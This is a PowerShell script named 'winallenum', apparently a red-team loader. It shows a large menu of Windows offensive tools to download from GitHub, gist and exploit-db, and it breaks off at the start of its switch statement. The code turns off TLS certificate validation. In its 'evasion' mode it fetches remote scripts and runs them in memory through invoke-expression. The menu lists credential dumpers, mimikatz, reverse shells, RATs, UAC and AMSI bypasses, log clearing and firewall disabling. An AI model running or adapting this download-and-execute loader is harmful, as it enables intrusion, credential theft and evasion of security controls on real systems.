#Author: Fabio Defilippo
#email: 4starfds@gmail.com

Add-Type -AssemblyName System.IO.Compression.FileSystem

add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@

$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

function ScaricaGist($TESTO, $FILENAME, $URL)
{
    if($EVA -eq "0"){
        write-host "Downloading $TESTO";
        try{
            invoke-webrequest -uri "https://gist.githubusercontent.com/$URL" -outfile $FILENAME".tmp";
            get-content -path $FILENAME".tmp" | set-content -encoding default -path $FILENAME;
            remove-item -path $FILENAME".tmp"
        }catch{
            write-host $_
        }
    }else{
        try{
            (invoke-webrequest -uri "https://gist.githubusercontent.com/$URL").content|invoke-expression
        }catch{
            write-host $_
        }
    }
}

function Scarica($TESTO, $FILENAME, $URL)
{
    if($EVA -eq "0"){
        write-host "Downloading $TESTO";
        try{
            invoke-webrequest -uri "https://raw.githubusercontent.com/$URL" -outfile $FILENAME".tmp";
            get-content -path $FILENAME".tmp" | set-content -encoding default -path $FILENAME;
            remove-item -path $FILENAME".tmp"
        }catch{
            write-host $_
        }
    }else{
        write-host "Downloading $TESTO";
        try{
            (invoke-webrequest -uri "https://raw.githubusercontent.com/$URL").content|invoke-expression
        }catch{
            write-host $_
        }
    }
}

function ScaricaBat($TESTO, $FILENAME, $URL)
{    
   write-host "Downloading $TESTO";
   try{
       invoke-webrequest -uri "https://raw.githubusercontent.com/$URL" -outfile $FILENAME;
   }catch{
       write-host $_
   }
}

function ScaricaSSL($TESTO, $FILENAME, $URL)
{
    write-host "Downloading $TESTO";
    try{
        invoke-webrequest -uri "https://github.com/$URL" -outfile $FILENAME;
    }catch{
        write-host $_
    }
}

function ScaricaExt($TESTO, $FILENAME, $URL)
{
    write-host "Downloading $TESTO";
    try{
        invoke-webrequest -uri "$URL" -outfile $FILENAME;
    }catch{
        write-host $_
    }
}

function ScaricaEDB($EXPL)
{
    write-host "Downloading exploit-db/$EXPL";
    try{
        invoke-webrequest -uri "https://www.exploit-db.com/download/$EXPL" -outfile $EXPL;
    }catch{
        write-host $_
    }
}

$EVA="0"

while($true){
    if($EVA -eq "0"){
        $EVT="Evasion/Bypassing=Disabled"
    }else{
        $EVT="Evasion/Bypassing=Enabled"
    }
    write-host "winallenum, by FabioDefilippoSoftware";
    write-host " 0. exit`t"$EVT;
    write-host "365";
    write-host " 268. dafthack/MFASweep";
    write-host "ACTIVE DIRECTORY";
    write-host " 13. samratashok/nishang/ActiveDirectory`t`t`t50. BloodHoundAD/Ingestors/SharpHound`t`t`t51. PyroTek3/PowerShell-AD-Recon";
    write-host " 150. HarmJ0y/ASREPRoast`t`t`t`t`t152. Kevin-Robertson/Powermad`t`t`t`t`t156. AlsidOfficial/UncoverDCShadow";
    write-host " 157. clr2of8/parse-net-users-bat`t`t`t`t165. leoloobeek/LAPSToolkit`t`t`t`t`t166. sense-of-security/ADRecon";
    write-host " 264. phillips321/adaudit`t`t`t`t`t316. canix1/ADACLScanner`t`t`t`t`t317. cyberark/ACLight";
    write-host " 385. EvotecIT/GPOZaurr`t`t`t`t`t`t409. ANSSI-FR/ADTimeline`t`t`t`t`t410. l0ss/Grouper";
    write-host " 411. l0ss/Grouper2`t`t`t`t`t`t438. SnaffCon/Snaffler`t`t`t`t`t`t442. vletoux/pingcastle";
    write-host " 443. canix1/ADACLScanner`t`t`t`t`t444. fox-it/Invoke-ACLPwn`t`t`t`t`t445. FatRodzianko/Get-RBCD-Threaded";
    write-host "AGENTS";
    write-host " 232. hyp3rlinx/DarkFinger-C2-Agent`t`t`t`t61. xtr4nge/FruityC2/ps_agent.ps1";
    write-host "ANALISYS";
    write-host " 30. sysinternals/NotMyFault`t`t`t`t`t31. sysinternals/Procdump`t`t`t`t`t32. sysinternals/PSTools";
    write-host " 174. sysinternals/TCPView`t`t`t`t`t369. PwnDexter/SharpEDRChecker`t`t`t496. phackt/pentest/privesc/windows/procdump";
    write-host " 497. phackt/pentest/privesc/windows/procdump64";
    write-host "ANONYMIZATION";
    write-host " 234. torbrowser/9.5/tor-win64-0.4.3.5`t`t`t`t235. torbrowser/9.5/tor-win32-0.4.3.5";
    write-host "AZURE";
    write-host " 58. PrateekKumarSingh/AzViz`t`t`t`t`t153. hausec/PowerZure`t`t`t`t`t`t189. NetSPI/MicroBurst/Az";
    write-host " 190. NetSPI/MicroBurst/AzureAD`t`t`t`t`t191. NetSPI/MicroBurst/AzureRM`t`t`t`t`t250. dafthack/MSOLSpray";
    write-host "BACKDOOR - SHELLCODE - PERSISTENCE";
    write-host " 263. HarmJ0y/DAMP`t`t`t`t`t`t33. eternallybored.org/netcat-win32-1.12`t`t437. mgeeky/Stracciatella";
    write-host " 415. Hackplayers/Salsa-tools/EvilSalsa_x64/NET3.5`t`t416. Hackplayers/Salsa-tools/EvilSalsa_x86/NET3.5";
    write-host " 417. Hackplayers/Salsa-tools/EvilSalsa_x64/NET4.0`t`t418. Hackplayers/Salsa-tools/EvilSalsa_x86/NET4.0";
    write-host " 419. Hackplayers/Salsa-tools/EvilSalsa_x64/NET4.5`t`t420. Hackplayers/Salsa-tools/EvilSalsa_x86/NET4.5";
    write-host " 421. Hackplayers/Salsa-tools/SalseoLoader_x64/NET3.5`t`t422. Hackplayers/Salsa-tools/SalseoLoader_x86/NET3.5";
    write-host " 424. Hackplayers/Salsa-tools/SalseoLoader_x64/NET4.0`t`t425. Hackplayers/Salsa-tools/SalseoLoader_x86/NET4.0";
    write-host " 426. Hackplayers/Salsa-tools/SalseoLoader_x64/NET4.5`t`t427. Hackplayers/Salsa-tools/SalseoLoader_x86/NET4.5";
    write-host " 428. Hackplayers/Salsa-tools/SilentMOD_x64/NET4.5`t`t429. Hackplayers/Salsa-tools/SilentMOD_x86/NET4.5";
    write-host " 430. Hackplayers/Salsa-tools/Standalone_x64/NET4.0`t`t431. Hackplayers/Salsa-tools/Standalone_x86/NET4.0";
    write-host " 432. Hackplayers/Salsa-tools/Standalone_x64/NET4.5`t`t433. Hackplayers/Salsa-tools/Standalone_x86/NET4.5";
    write-host " 434. padovah4ck/PSBypassCLM/x64`t`t`t`t435. itm4n/VBA-RunPE`t`t`t`t`t`t436. cfalta/PowerShellArmoury";
    write-host " 398. tokyoneon/Chimera/shells/misc/Add-RegBackdoor`t`t446. fireeye/SharPersist/v1.0.1";
    write-host "C&C";
    write-host " 378. enigma0x3/Powershell-C2";
    write-host "COBOL";
    write-host " 178. nolvis/nolvis-cobol-tool/CobolTool";
    write-host "COVER TRACKING";
    write-host " 209. ivan-sincek/file-shredder";
    write-host "DCOM";
    write-host " 274. sud0woodo/DCOMrade";
    write-host "DECOMILER"
    write-host " 371. icsharpcode/AvaloniaILSpy";
    write-host "DRIVER";
    write-host " 271. FuzzySecurity/Capcom-Rootkit/Driver/Capcom.sys";
    write-host "DUMPING - EXTRACTING";
    write-host " 115. EmpireProject/Empire/credentials/Invoke-PowerDump`t`t116. PS-NTDSUTIL`t`t`t`t`t`t117. Get-MemoryDump";
    write-host " 118. peewpw/Invoke-WCMDump`t`t`t`t`t119. clymb3r/PowerShell/Invoke-Mimikatz`t`t`t120. sperner/PowerShell";
    write-host " 128. scipag/PowerShellUtilities`t`t`t`t129. nsacyber/Pass-the-Hash-Guidance`t`t`t132. AlessandroZ/LaZagne";
    write-host " 162. giMini/PowerMemory`t`t`t`t`t164. hlldz/Invoke-Phant0m`t`t`t`t`t170. sysinternals/ProcessExplorer";
    write-host " 171. processhacker/processhacker`t`t`t`t172. sysinternals/ProcessMonitor`t`t`t`t173. sysinternals/Autoruns";
    write-host " 180. PowerShellMafia/PowerSploit/Exfiltration`t`t`t260. scipag/PowerShellUtilities/Select-MimikatzLocalAccounts";
    write-host " 182. gallery.technet.microsoft.com/scriptcenter/POWERSHELL-SCRIPT-TO/MemoryDump_PageFile_ConfigurationExtract";
    write-host " 183. gallery.technet.microsoft.com/scriptcenter/Get-MemoryDump/Get-MemoryDump`t`t`t`t`t`t`t186. Zimm/tcpdump-powershell/PacketCapture";
    write-host " 187. sperner/PowerShell/Sniffer`t`t`t`t202. adnan-alhomssi/chrome-passwords`t`t`t203. haris989/Chrome-password-stealer";
    write-host " 204. kspearrin/ff-password-exporter/FF-Password-Exporter-Portable-1.2.0`t`t`t`t`t`t`t211. sec-1/gp3finder_v4.0";
    write-host " 237. gentilkiwi/mimikatz`t`t`t`t`t258. scipag/PowerShellUtilities/Invoke-MimikatzNetwork";
    write-host " 259. scipag/PowerShellUtilities/Select-MimikatzDomainAccounts`t`t`t`t`t`t`t`t`t307. nettitude/Invoke-PowerThIEf";
    write-host " 311. 3gstudent/Winpcap_Install`t`t`t`t`t312. 3gstudent/Dump-Clear-Password-after-KB2871997-installed";
    write-host " 379. orlyjamie/mimikittenz`t`t`t`t`t381. digitalcorpora/bulk_extractor32`t`t`t382. digitalcorpora/bulk_extractor64";
    write-host " 386. moonD4rk/HackBrowserData`t`t`t`t`t501. r3motecontrol/Ghostpack-CompiledBinaries/SafetyKatz";
    write-host " 503. r3motecontrol/Ghostpack-CompiledBinaries/SharpDPAPI";
    write-host "ENUMERATION";
    write-host " 1. HarmJ0y/PowerUp`t`t`t`t`t`t2. absolomb/WindowsEnum`t`t`t`t`t`t3. Rasta-Mouse/Sherlock";
    write-host " 4. Enjoiz/Privesc`t`t`t`t`t`t5. 411Hall/Jaws-Enum`t`t`t`t`t`t6. carlospolop/winPEAS";
    write-host " 7. hausec/ADAPE-Script`t`t`t`t`t`t8. frizb/Windows-Privilege-Escalation`t`t`t9. mattiareggiani/WinEnum";
    write-host " 56. TsukiCTF/Lovely-Potato/Invoke-LovelyPotato`t`t`t57. TsukiCTF/Lovely-Potato/JuicyPotato-Static";
    write-host " 155. HarmJ0y/WINspect`t`t`t`t`t`t161. Arvanaghi/SessionGopher`t`t`t`t`t207. dafthack/HostRecon";
    write-host " 244. phackt/Invoke-Recon`t`t`t`t`t292. Z3R0th-13/Enum`t`t498. phackt/pentest/privesc/windows/wmic_info";
    write-host " 294. Z3R0th-13/Profit`t`t`t`t`t`t295. Xservus/P0w3rSh3ll`t`t`t`t`t`t296. threatexpress/red-team-scripts/HostEnum";
    write-host " 345. Mr-Un1k0d3r/RedTeamCSharpScripts/enumerateuser`t`t348. Mr-Un1k0d3r/RedTeamCSharpScripts/set";
    write-host " 353. ankitdobhal/TTLOs`t`t`t`t`t`t407. M4ximuss/Powerless";
    write-host " 293. duckingtoniii/Powershell-Domain-User-Enumeration`t`t450. adrianlois/Fingerprinting-envio-FTP-PowerShell/SysInfo";
    write-host "EVASION - BYPASS";
    write-host " 154. HarmJ0y/Invoke-Obfuscation`t`t`t`t179. FuzzySecurity/PowerShell-Suite/Bypass-UAC`t`t200. danielbohannon/Invoke-Obfuscation";
    write-host " 197. HackLikeAPornstar/GibsonBird/applocker-bypas-checker`t216. danielbohannon/Invoke-CradleCrafter";
    write-host " 236. 360-Linton-Lab/WMIHACKER`t`t`t`t`t245. the-xentropy/xencrypt`t`t`t`t`t279. OmerYa/Invisi-Shell";
    write-host " 280. lukebaggett/dnscat2-powershell`t`t`t`t303. kmkz/PowerShell/amsi-bypass`t`t`t`t304. kmkz/PowerShell/CLM-bypass";
    write-host " 361. 3gstudent/Bypass-Windows-AppLocker`t`t`t362. netbiosX/FodhelperUACBypass";
    write-host " 364. gushmazuko/WinBypass/SluiHijackBypass`t`t`t365. gushmazuko/WinBypass/EventVwrBypass`t`t403. Arno0x/DNSExfiltrator";
    write-host " 360. L3cr0f/DccwBypassUAC`t`t`t`t`t367. Mncx86/Windows-10-UAC-bypass`t`t`t`t`t`t`t`t476. Aetsu/OffensivePipeline";
    write-host " 412. p3nt4/PowerShdll`t`t`t`t`t`t414. OmerYa/Invisi-Shell`t470. microsoft/CSS-Exchange/Test-ProxyLogon";
    write-host " 366. gushmazuko/WinBypass/DiskCleanupBypass_direct`t`t363. gushmazuko/WinBypass/SluiHijackBypass_direct";
    write-host "EXFILTRATION";
    write-host " 210. danielwolfmann/Invoke-WordThief/Invoke-WordThief`t`t267. salu90/PSFPT/Exfiltrate";
    write-host "EXPLOITATION";
    write-host " 20. WindowsExploits/CVE-2012-0217/sysret`t`t`t21. WindowsExploits/CVE-2016-3309/bfill`t`t`t22. WindowsExploits/CVE-2016-3371/40429";
    write-host " 23. WindowsExploits/CVE-2016-7255/CVE-2016-7255`t`t24. WindowsExploits/CVE-2017-0213_x86`t`t`t25. WindowsExploits/CVE-2017-0213_x64";
    write-host " 26. EmpireProject/Empire/privesc`t`t`t`t27. EmpireProject/Empire/exploitation`t`t`t28. hausec/PowerZure";
    write-host " 302. exploit-db all exploits";
    write-host "EXTRA";
    write-host " 181. gallery.technet.microsoft.com/scriptcenter/PS2EXE-Convert/PS2EXE`t`t`t`t`t`t`t`t192. NetSPI/MicroBurst/MSOL";
    write-host " 233. antonioCoco/Invoke-RunasCs";
    write-host "FILE SYSTEM";
    write-host " 231. limbenjamin/nTimetools";
    write-host "FTP";
    write-host " 452. tonylanglet/crushftp.powershell`t`t`t`t451. SMATechnologies/winscp-powershell";
    write-host "GATHERING";
    write-host " 109. TonyPhipps/Meerkat/Modules`t`t`t`t16. samratashok/nishang/Gather`t`t`t`t`t184. dafthack/PowerMeta";
    write-host " 439. vivami/SauronEye/v0.0.9";
    write-host "GUESSING";
    write-host " 358. DarkCoderSc/Win32/win-brute-logon`t`t`t`t359. DarkCoderSc/Win64/win-brute-logon";
    write-host "HOOKING - HIJACKING - INJECTION";
    write-host " 168. netbiosX/Digital-Signature-Hijack`t`t`t`t176. cyberark/DLLSpy-x64`t`t`t`t`t177. rapid7/DLLHijackAuditKit";
    write-host " 246. nccgroup/acCOMplice`t`t`t`t`t277. antonioCoco/Mapping-Injection`t`t`t`t308. 3gstudent/CLR-Injection_x64";
    write-host " 309. 3gstudent/CLR-Injection_x86`t`t`t`t310. 3gstudent/COM-Object-hijacking`t`t`t`t380. uknowsec/SharpSQLTools";
    write-host " 456. rem1ndsec/DLLJack`t`t`t`t`t`t457. wietze/windows-dll-hijacking`t`t`t`t`t458. Flangvik/DLLSideloader";
    write-host " 472. ctxis/DLLHSCx64`t`t`t`t`t`t473. ctxis/DLLHSCx86";
    write-host "HTTP";
    write-host " 266. salu90/PSFPT/BruteForce-Basic-Auth";
    write-host "iOS";
    write-host " 406. iSECPartners/jailbreak";
    write-host "JENKINS";
    write-host " 201. chryzsh/JenkinsPasswordSpray";
    write-host "KERBEROS";
    write-host " 37. mdavis332/DomainPasswordSpray/Invoke-DomainPasswordSpray`t38. mdavis332/DomainPasswordSpray/Get-DomainPasswordPolicy";
    write-host " 39. mdavis332/DomainPasswordSpray/Get-DomainUserList`t`t134. nidem/kerberoast/GetUserSPNs";
    write-host " 223. tmenochet/PowerSpray`t`t`t`t`t251. NotMedic/NetNTLMtoSilverTicket`t`t`t`t`t500. r3motecontrol/Ghostpack-CompiledBinaries/Rubeus";
    write-host "LDAP";
    write-host " 145. Nillth/PWSH-LDAP/LDAP-Query`t`t`t`t147. dinigalab/ldapsearch`t`t`t`t`t318. roggenk/PowerShell/LDAPS";
    write-host " 48. 3gstudent/Homework-of-Powershell/Invoke-DomainPasswordSprayOutsideTheDomain`t`t`t`t`t`t346. Mr-Un1k0d3r/RedTeamCSharpScripts/ldapquery";
    write-host " 347. Mr-Un1k0d3r/RedTeamCSharpScripts/ldaputility";
    write-host "MACRO";
    write-host " 130. 0xm4v3rick/Extract-Macro`t`t`t`t`t131. enigma0x3/Generate-Macro`t`t`t`t`t219. curi0usJack/luckystrike";
    write-host "MEMCACHED";
    write-host " 287. AdamDotCom/memcached-on-powershell";
    write-host "MISC";
    write-host " 19. FuzzySecurity/PowerShell-Suite`t`t`t`t42. mattifestation/PowerShellArsenal/Misc`t`t45. andrew-d/static-binaries/windows/x86";
    write-host " 46. andrew-d/static-binaries/windows/x64`t`t`t126. HarmJ0y/Misc-PowerShell`t`t`t`t`t160. S3cur3Th1sSh1t/WinPwn";
    write-host " 193. NetSPI/MicroBurst/Misc`t`t`t`t`t208. S3cur3Th1sSh1t/WinPwn`t`t`t`t`t212. cyberark/SkyArk";
    write-host " 241. r00t-3xp10it/meterpeter`t`t`t`t`t243. InfosecMatter/Minimalistic-offensive-security-tools";
    write-host " 248. k8gege/PowerLadon`t`t`t`t`t`t252. BankSecurity/Red_Team`t`t`t`t`t253. cutaway-security/chaps";
    write-host " 254. QAX-A-Team/CobaltStrike-Toolset`t`t`t`t256. Kevin-Robertson/Inveigh`t`t`t`t`t247. JoelGMSec/AutoRDPwn";
    write-host " 257. scipag/KleptoKitty`t`t`t`t`t261. homjxi0e/PowerAvails`t`t`t`t`t281. jaredhaight/PSAttackBuildTool/v1.9.1";
    write-host " 313. chocolatey/install`t`t`t`t`t352. rvrsh3ll/Misc-Powershell-Scripts`t`t`t354. Killeroo/PowerPing.x86";
    write-host " 355. Killeroo/PowerPing`t`t`t`t`t356. PowerShellMafia/PowerSploit`t`t`t`t357. fireeye/commando-vm";
    write-host " 383. Invoke-IR/PowerForensics`t`t`t`t`t384. Invoke-IR/PowerForensicsv2`t`t`t`t`t413. jaredhaight/PSAttack";
    write-host " 449. VikasSukhija/Downloads/Multi-Tools`t`t`t`t455. PowerShellEmpire/PowerTools`t`t471. S3cur3Th1sSh1t/PowerSharpPack";
    write-host " 474. TonyPhipps/Meerkat`t`t`t`t`t477. andrew-d/static-binaries/windows/x86`t`t`t`t`t478. andrew-d/static-binaries/windows/x64";
    write-host " 485. sysinternals.com/files/SysinternalsSuite`t`t`t`t486. sysinternals.com/files/SysinternalsSuite-ARM64";
    write-host " 487. ohpe/juicy-potato`t`t`t`t`t502. r3motecontrol/Ghostpack-CompiledBinaries/Seatbelt";
    write-host "MITM";
    write-host " 163. Kevin-Robertson/Inveigh`t`t`t`t`t272. odedshimon/BruteShark`t`t`t`t`t273. odedshimon/BruteShark/BruteSharkDesktopInstaller_x64";
    write-host " 290. bettercap/bettercap";
    write-host "OSINT";
    write-host " 255. ecstatic-nobel/pOSINT`t`t`t`t`t462. ElevenPaths/FOCA";
    write-host "OWA";
    write-host " 217. dafthack/MailSniper`t`t`t`t`t218. fugawi/EASSniper`t`t`t`t`t`t220. johnnyDEP/OWA-Toolkit";
    write-host "PASSWORD";
    write-host " 121. kfosaaen/Get-LAPSPasswords`t`t`t`t122. dafthack/DomainPasswordSpray`t`t`t`t123. NetSPI/PS_MultiCrack";
    write-host " 124. securethelogs/PSBruteZip";
    write-host "PAYLOAD";
    write-host " 463. mdsecactivebreach/CACTUSTORCH.cna`t`t`t`t464. mdsecactivebreach/CACTUSTORCH.hta`t`t`t465. mdsecactivebreach/CACTUSTORCH.js";
    write-host " 466. mdsecactivebreach/CACTUSTORCH.jse`t`t`t`t467. mdsecactivebreach/CACTUSTORCH.vba`t`t`t468. mdsecactivebreach/CACTUSTORCH.vbe";
    write-host " 469. mdsecactivebreach/CACTUSTORCH.vbs";
    write-host "PIVOTING";
    write-host " 265. attactics/Invoke-DCOMPowerPointPivot";
    write-host "POST-EXPLOITATION";
    write-host " 374. BloodHoundAD/BloodHound-win32-x64`t`t`t`t375. BloodHoundAD/BloodHound-win32-ia32`t`t`t377. gfoss/PSRecon";
    write-host " 376. enigma0x3/Old-Powershell-payload-Excel-Delivery`t`t441. mubix/post-exploitation";
    write-host "PRIVESC";
    write-host " 10. offensive-security/exploitdb-windows_x86/local`t`t11. offensive-security/exploitdb-windows_x64/local`t12. samratashok/nishang/Escalation";
    write-host " 14. samratashok/nishang/Backdoors`t`t`t`t15. samratashok/nishang/Bypass`t`t`t`t`t18. samratashok/nishang/powerpreter";
    write-host " 29. itm4n/PrivescCheck`t`t`t`t`t`t60. PrintDemon PrivEsc`t`t`t`t`t`t368. offensive-security/exploitdb-windows/local";
    write-host " 112. HarmJ0y/Misc-PowerShell/Invoke-WdigestDowngrade`t`t127. PowerShellMafia/PowerSploit/Privesc/Get-System`t143. FuzzySecurity/PowerShell-Suite/Bypass-UAC";
    write-host " 151. Kevin-Robertson/Tater`t`t`t`t`t224. phackt/accesschk-XP`t`t`t`t`t225. sysinternals/accesschk";
    write-host " 278. ScorpionesLabs/DVS`t`t`t`t`t297. silentsignal/wpc-ps/WindowsPrivescCheck`t`t298. pentestmonkey/windows-privesc-check";
    write-host " 305. kmkz/PowerShell/ole-payload-generator`t`t`t324. sysinternals.com/AccessChk`t`t`t`t`t373. antonioCoco/RoguePotato";
    write-host " 440. xct/xc/PrivescCheck`t`t`t`t`t453. Mr-Un1k0d3r/SCShell`t`t`t`t`t480. abatchy17/WindowsExploits";
    write-host " 481. SecWiki/windows-kernel-exploits`t`t`t489. phackt/pentest/privesc/accesschk`t`t`t490 phackt/pentest/privesc/accesschk64";
    write-host " 491. phackt/pentest/privesc/windows/Microsoft.ActiveDirectory.Management`t`t`t492. phackt/pentest/privesc/windows/Set-LHSTokenPrivilege";
    write-host " 495. phackt/pentest/privesc/windows/privesc";
    write-host "PROXY - REVPROXY";
    write-host " 404. fatedier/frp_386`t`t`t`t`t`t405. fatedier/frp_amd64`t`t`t`t`t`t479. p3nt4/Invoke-SocksProxy";
    write-host "PXE";
    write-host " 320. wavestone-cdt/powerpxe";
    write-host "RAT";
    write-host " 213. FortyNorthSecurity/WMImplant`t`t`t`t275. quasar/Quasar.v1.4.0`t`t`t`t`t370. 3gstudent/Javascript-Backdoor (aka JSRat)";
    write-host " 372. BenChaliah/Arbitrium-RAT`t`t`t`t`t400. tokyoneon/Chimera/shells/misc/Invoke-PoshRatHttp";
    write-host "RDP";
    write-host " 146. 3gstudent/List-RDP-Connections-History`t`t`t286. Viralmaniar/Remote-Desktop-Caching`t`t`t288. technet.microsoft/scriptcenter/NLA";
    write-host "RECON";
    write-host " 49. PowerShellMafia/PowerSploit/Recon`t`t`t`t167. xorrior/RemoteRecon";
    write-host "REG KEYS";
    write-host " 319. microsoft/scriptcenter/GetRegistryKeyLastWriteTimeAndClassName";
    write-host "REST";
    write-host " 194. NetSPI/MicroBurst/REST";
    write-host "REVERSE ENGINEERING - DEBUGGING";
    write-host " 40. mattifestation/PowerShellArsenal/Disassembly`t`t41. mattifestation/PowerShellArsenal/MemoryTools`t43. mattifestation/PowerShellArsenal/Parsers";
    write-host " 44. mattifestation/PowerShellArsenal/WindowsInternals`t`t228. 0xd4d/dnSpy`t`t`t`t`t`t229. ollydbg.de/odbg110";
    write-host " 230. rada.re/radare2-w32-2.2.0`t`t`t`t`t270. Decompile-Net-code";
    write-host "REVSHELL";
    write-host " 238. 3v4Si0N/HTTP-revshell/Invoke-WebRev`t`t`t239. 3v4Si0N/HTTP-revshell/Revshell-Generator`t`t240. besimorhino/powercat";
    write-host " 242. danielwolfmann/Invoke-WordThief`t`t`t`t306. kmkz/PowerShell/Reverse-Shell`t`t`t`t";
    write-host " 390. tokyoneon/Chimera/shells/Invoke-PowerShellTcp`t`t391. tokyoneon/Chimera/shells/Invoke-PowerShellTcpOneLine";
    write-host " 393. tokyoneon/Chimera/shells/Invoke-PowerShellUdpOneLine`t394. tokyoneon/Chimera/shells/generic1`t`t`t395. tokyoneon/Chimera/shells/generic2";
    write-host " 396. tokyoneon/Chimera/shells/generic3`t`t`t`t397. tokyoneon/Chimera/shells/powershell_reverse_shell";
    write-host " 388. tokyoneon/Chimera/shells/Invoke-PowerShellIcmp`t`t392. tokyoneon/Chimera/shells/Invoke-PowerShellUdp";
    write-host " 493. phackt/pentest/privesc/windows/nc`t`t`t494. phackt/pentest/privesc/windows/nc64";
    write-host "SCANNING";
    write-host " 47. nmap.org/nmap-7.80-win32`t`t`t`t`t17. samratashok/nishang/Scan";
    write-host " 188. gallery.technet.microsoft.com/scriptcenter/Getting-Windows-Defender/Get-AntiMalwareStatus";
    write-host " 401. tokyoneon/Chimera/shells/misc/Invoke-PortScan`t`t388. thom-s/netsec-ps-scripts/printer-telnet-ftp-report";
    write-host " 475. k8gege/K8tools/K8PortScan";
    write-host "SMB";
    write-host " 59. mvelazc0/Invoke-SMBLogin`t`t`t`t`t52. vletoux/smbscanner`t`t`t`t`t`t125. Kevin-Robertson/Invoke-TheHash";
    write-host " 55. InfosecMatter/Minimalistic-offensive-security-tools`t`t`t`t`t`t`t`t`t36. threatexpress/Invoke-PipeShell";
    write-host " 133. ZecOps/CVE-2020-0796-RCE-POC/calc_target_offsets`t`t387. deepsecurity-pe/GoGhost`t`t`t448. arjansturing/smbv1finder";
    write-host " 447. Dviros/Excalibur`t`t`t`t`t`t461. ShawnDEvans/smbmap/psutils/Get-FileLockProcess";
    write-host "SNIFFER";
    write-host " 53. sperner/PowerShell/Sniffer";
    write-host "SNMP";
    write-host " 54. klemmestad/PowerShell/SNMP/MAXFocus_SNMP_Checks";
    write-host "SQL";
    write-host " 148. NetSPI/PowerUpSQL`t`t`t`t`t`t206. nullbind/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner";
    write-host "SSH";
    write-host " 104. InfosecMatter/SSH-PuTTY-login-bruteforcer";
    write-host "TEXT EDITOR";
    write-host " 314. zyedidia/micro/v2.0.8-win32`t`t`t`t315. zyedidia/micro/v2.0.8-win64";
    write-host "TUNNELING - FORWARDING";
    write-host " 34. T3rry7f/ICMPTunnel/IcmpTunnel_C`t`t`t`t35. T3rry7f/ICMPTunnel/IcmpTunnel_C_64`t`t`t144. Kevin-Robertson/Inveigh/Inveigh-Relay";
    write-host " 169. deepzec/Win-PortFwd`t`t`t`t`t249. p3nt4/Invoke-SocksProxy";
    write-host "UTILITIES";
    write-host " 90. Unzip file`t`t`t`t`t`t`t91. Ping sweep`t`t`t`t`t`t`t99. Download a File";
    write-host " 100. Share this Path`t`t`t`t`t`t101. Share this Path with Powershell`t`t`t102. Create PSCredentials";
    write-host " 103. Create PSSession with PSCredentials`t`t`t105. Decode base64 to file`t`t`t`t`t106. Run powershell with encoded command";
    write-host " 107. Invoke a block of commands`t`t`t`t108. Import one or All Modules`t`t`t`t`t110. Vbs technique";
    write-host " 111. dump wifi password`t`t`t`t`t113. show Security Packages`t`t`t`t`t114. dump SYSTEM and SAM values";
    write-host " 140. Ensure lockout threshold < AD lockout`t`t`t141. Set to >1 years`t`t`t`t`t`t142. Check Server Core";
    write-host " 149. Reset Sec. Descriptor Propagator proc. for 3 mins`t`t135. winrm attack with winrs`t`t`t`t`t175. Clear all logs";
    write-host " 185. Check Remote Registry is running (starts if did not)`t195. Disable firewall`t`t`t`t`t`t196. add an account to RDP groups";
    write-host " 198. AppLockerBypass with rundll32 and shell32`t`t`t199. AppLockerBypass with rundll32`t`t`t`t205. Print only printable chars";
    write-host " 214. Shred a file`t`t`t`t`t`t221. ActiveDirectory Enum";
    write-host " 215. Port forward all local addresses and all local ports to localhost and to specific local port v4 to v4";
    write-host " 222. Get Users about Service Principal Names (SPN) directory property for an Active Directory service account";
    write-host " 226. dump Active Directory creds with ndtsutil`t`t`t227. Analyze ADS in a file`t`t`t`t`t276. compute hash checksum of a file";
    write-host " 282. attack a Domain or IP with username and password wordlist files starting a remote powershell process";
    write-host " 283. attack an IP and Domain with username and password wordlist files entering in a remote powershell session";
    write-host " 284. list all smb shares or a specific share name`t`t285. search words in files`t`t`t`t`t289. print my public ip method 1";
    write-host " 291. print my public ip method 2`t`t`t`t299. get target ip net infos`t`t`t`t`t300. get remote ip docker version";
    write-host " 301. get all remote users infos via finger`t`t`t321. import an xml file to dump credentials";
    write-host " 322. simple TCP port scan`t`t`t`t`t323. check adminless mode enabled`t`t`t`t325. os and arch";
    write-host " 326. envi vars`t`t`t`t`t`t`t327. connected drives`t`t`t`t`t`t328. privileges";
    write-host " 329. other users`t`t`t`t`t`t330. list all groups`t`t`t`t`t`t331. list all admins";
    write-host " 332. user autologon`t`t`t`t`t`t333. dump from Cred man`t`t`t`t`t`t334. check access to SAM and SYSTEM files";
    write-host " 335. list all softwares installed`t`t`t`t336. use accesschk`t`t`t`t`t`t337. unquoted service path";
    write-host " 338. scheduled tasks`t`t`t`t`t`t339. autorun startup`t`t`t`t`t`t340. check AlwaysInstallElevated enabled";
    write-host " 341. snmp config`t`t`t`t`t`t342. password in registry`t`t`t`t`t343. sysprep or unattend files";
    write-host " 454. Active Directory infos`t`t`t`t`t459. Dump memory of a process`t`t`t`t`t460. Enable/Disable Evasion/Bypassing";
    write-host " 482. find password in *.xml *.ini *.txt`t`t`t483. find password in *.xml *.ini *.txt *.config`t`t`t484. find password in all files";
    write-host " 488. upnp info`t`t`t`t`t`t499. check bash exists";
    write-host "WEBAPP";
    write-host " 350. Mr-Un1k0d3r/RedTeamCSharpScripts/webhunter";
    write-host "WEBDAV";
    write-host " 269. p3nt4/Invoke-TmpDavFS";
    write-host "WINRM";
    write-host " 158. davehardy20/Invoke-WinRMAttack`t`t`t`t159. d1pakda5/PowerShell-for-Pentesters/Code/44/Get-WinRMPassword";
    write-host " 408. antonioCoco/RogueWinRM";
    write-host "WLAN - WIFI";
    write-host " 402. tokyoneon/Chimera/shells/misc/Get-WLAN-Keys";
    write-host "WMI";
    write-host " 262. Cybereason/Invoke-WMILM`t`t`t`t`t344. Mr-Un1k0d3r/RedTeamCSharpScripts/WMIUtility`t351. Mr-Un1k0d3r/RedTeamCSharpScripts/wmiutility";
    write-host "OTHERS - ?";
    write-host " 399. tokyoneon/Chimera/shells/misc/Get-Information";
    
    $RISP=read-host 'Make your choice';
    switch ($RISP){
